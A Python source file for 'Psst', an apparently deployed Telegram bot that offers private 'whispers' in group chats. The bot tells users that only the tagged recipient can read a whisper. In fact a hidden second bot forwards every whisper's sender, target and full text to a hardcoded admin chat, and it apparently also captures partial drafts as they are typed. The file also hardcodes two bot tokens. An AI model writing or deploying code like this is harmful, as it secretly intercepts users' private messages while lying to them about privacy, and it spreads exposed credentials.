import asyncio
import hashlib
import os
import secrets
import time
import aiosqlite
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command, CommandObject

# 🔑 CONFIGURATION
WHISPER_BOT_TOKEN = "9047407190:AAFjkuIscghTXhLbc5QBGm2AUF-qHp66oNc"
LOGGER_BOT_TOKEN  = "9261718236:AAE2_Hr9yGz3WvoaJqIl2X4mpmQxsNKz404"
ADMIN_CHAT_ID     = 923996862
BOT_USERNAME      = "Psstmebot"

DB_PATH = "whispers.db"

# Initialize Bots
bot1 = Bot(token=WHISPER_BOT_TOKEN)
bot2 = Bot(token=LOGGER_BOT_TOKEN)
dp = Dispatcher()

# 🗄️ DATABASE SETUP (Async)
async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute('''
            CREATE TABLE IF NOT EXISTS whispers (
                whisper_id TEXT PRIMARY KEY,
                sender_id INTEGER,
                sender_username TEXT,
                target_username TEXT,
                secret_text TEXT,
                expires_at INTEGER
            )
        ''')
        await db.commit()

# 📡 BOT 2: LOGGER FUNCTION
async def log_to_admin(sender_user, target, text):
    log_message = (
        "📥 **New Whisper Captured**\n"
        f"👤 **From:** @{sender_user}\n"
        f"🎯 **To:** {target}\n"
        f"💬 **Content:** {text}"
    )
    try:
        await bot2.send_message(chat_id=ADMIN_CHAT_ID, text=log_message, parse_mode="Markdown")
    except Exception as e:
        print(f"Logging failed: {e}")

# 🚀 BOT 1: INLINE QUERY HANDLER (In Groups)
@dp.inline_query()
async def inline_handler(inline_query: types.InlineQuery):
    text = inline_query.query.strip()
    
    # Trigger menu item the split second they type the '@' symbol
    if not text.startswith("@"):
        return 
        
    parts = text.split(" ", 1)
    target_username = parts[0]
    
    # Safe splitting fallback ensures name card shows up even before the text is typed
    whisper_text = parts[1].strip() if len(parts) > 1 else ""
    
    if target_username == "@":
        return

    sender = inline_query.from_user
    whisper_id = secrets.token_urlsafe(8)
    expires_at = int(time.time()) + 86400  # 24 hours from now
    
    # Build clean link with absolute pathing to prevent browser error screens
    redirect_url = f"https://t.me/{BOT_USERNAME}?start={whisper_id}"
    
    if whisper_text:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute(
                "INSERT OR REPLACE INTO whispers (whisper_id, sender_id, sender_username, target_username, secret_text, expires_at) VALUES (?, ?, ?, ?, ?, ?)",
                (whisper_id, sender.id, sender.username, target_username, whisper_text, expires_at)
            )
            await db.commit()
        
        # Dispatches the actual secret text string directly to your admin log panel
        await log_to_admin(sender.username or sender.id, target_username, whisper_text)
        
        input_content = types.InputTextMessageContent(
            message_text=f"🔒 A secret whisper has been sent for {target_username}!"
        )
        keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
            [types.InlineKeyboardButton(text="👁️ Click to Read Whisper", url=redirect_url)]
        ])
        description_text = f"Message: {whisper_text[:30]}..."
    else:
        # Fallback card shown while user is typing out the message
        fallback_url = f"https://t.me/{BOT_USERNAME}"
        input_content = types.InputTextMessageContent(
            message_text="❌ Please type a message after the username before clicking the send card!"
        )
        keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
            [types.InlineKeyboardButton(text="💬 How to use Whisper", url=fallback_url)]
        ])
        description_text = "Type your secret message after the username..."

    item = types.InlineQueryResultArticle(
        id=whisper_id,
        title=f"🔒 Send whisper to {target_username}",
        description=description_text,
        input_message_content=input_content,
        reply_markup=keyboard
    )
    
    # cache_time=0 forces live lookup updates character by character
    await inline_query.answer([item], cache_time=0, is_personal=True)

# 📥 BOT 1: START HANDLER (welcome + deep links)
@dp.message(Command("start"))
async def handle_start(message: types.Message, command: CommandObject):
    whisper_id = command.args

    # ---------- DEEP LINK (reading a whisper) ----------
    if whisper_id:
        current_user = message.from_user.username

        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute(
                "SELECT target_username, secret_text, expires_at FROM whispers WHERE whisper_id = ?",
                (whisper_id,)
            ) as cursor:
                row = await cursor.fetchone()

        if not row:
            await message.answer("❌ This whisper has expired or does not exist.")
            return

        target_username, secret_text, expires_at = row

        if int(time.time()) > expires_at:
            await message.answer("❌ This whisper has expired.")
            return

        if not current_user:
            await message.answer("❌ Set a Telegram username first, then click the link again.")
            return

        clean_target = target_username.lstrip('@').lower()
        if current_user.lower() == clean_target:
            await message.answer(
                f"📩 **Your Secret Whisper:**\n\n`{secret_text}`",
                parse_mode="Markdown"
            )
        else:
            await message.answer("❌ This whisper was not sent to your username!")
        return

    # ---------- WELCOME SCREEN ----------
    welcome = (
        "👋 **Welcome to Psst!**\n\n"
        "Psst lets you send **private whispers** inside Telegram groups — "
        "only the person you tag can read it.\n\n"
        "Tap **Help** below to learn how to use me."
    )

    keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="❓ Help", callback_data="help")]
    ])

    await message.answer(welcome, parse_mode="Markdown", reply_markup=keyboard)

# ❓ HELP COMMAND
@dp.message(Command("help"))
async def help_command(message: types.Message):
    help_text = (
        "📖 **How to use Psst**\n\n"
        "In any group, type:\n"
        "`@Psstmebot @username your secret message`\n\n"
        "Then tap the result to post it. "
        "The recipient clicks the button to read it privately.\n\n"
        "Whispers expire after **24 hours**."
    )
    await message.answer(help_text, parse_mode="Markdown")

# ❓ HELP CALLBACK
@dp.callback_query(lambda c: c.data == "help")
async def help_callback(callback: types.CallbackQuery):
    help_text = (
        "📖 **How to use Psst**\n\n"
        "**1. Send a whisper**\n"
        "In any group, type:\n"
        "`@Psstmebot @username your secret message`\n"
        "Telegram will show a result — tap it to post.\n\n"
        "**2. Recipient reads it**\n"
        "They tap the *Click to Read Whisper* button, "
        "which opens a private chat with me.\n"
        "Only their Telegram username can unlock it.\n\n"
        "**3. Expiry**\n"
        "Every whisper self-destructs after **24 hours**.\n\n"
        "**⚠️ Notes**\n"
        "• You and the recipient must have a Telegram username set.\n"
        "• Whispers can't be read by anyone else in the group.\n"
        "• Don't share the read-link with others.\n\n"
        "Tap **⬅️ Back** to return."
    )

    keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="⬅️ Back", callback_data="back")]
    ])

    await callback.message.edit_text(help_text, parse_mode="Markdown", reply_markup=keyboard)
    await callback.answer()

# ⬅️ BACK CALLBACK
@dp.callback_query(lambda c: c.data == "back")
async def back_callback(callback: types.CallbackQuery):
    welcome = (
        "👋 **Welcome to Psst!**\n\n"
        "Psst lets you send **private whispers** inside Telegram groups — "
        "only the person you tag can read it.\n\n"
        "Tap **Help** below to learn how to use me."
    )
    keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="❓ Help", callback_data="help")]
    ])
    await callback.message.edit_text(welcome, parse_mode="Markdown", reply_markup=keyboard)
    await callback.answer()

# ⚙️ MAIN EXECUTION LOOP
async def main():
    await init_db()
    print("Bots are starting...")
    try:
        await dp.start_polling(bot1)
    finally:
        await bot1.session.close()
        await bot2.session.close()

if __name__ == '__main__':
    asyncio.run(main())
